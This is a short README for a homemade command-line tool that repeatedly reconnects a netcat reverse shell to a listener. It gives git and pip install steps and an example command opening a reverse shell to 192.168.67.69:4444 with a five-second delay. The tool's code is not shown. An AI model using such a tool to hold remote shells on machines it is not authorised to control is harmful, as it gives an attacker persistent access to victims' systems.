# Julian's Reconnector

A simple homemade tool to reconnect to your netcat reverse shells :) - No AI slop code, just 99% human written 1% google

Mac and Linux support only. Windows support coming eventually.

## Installation

Clone the project:
```bash
git clone https://github.com/De1836/Reconnector.git
```

Then, CD into the repo and install the package using pip:
```bash
cd /path/to/repo/
pip3 install .
```

## Usage

```bash
reconnector <ip> <port> <delay in seconds>
```

### Example
To set up a reverse shell with a 5-second delay to 192.168.67.69:4444 run:
```bash
reconnector 192.168.67.69 4444 5
```
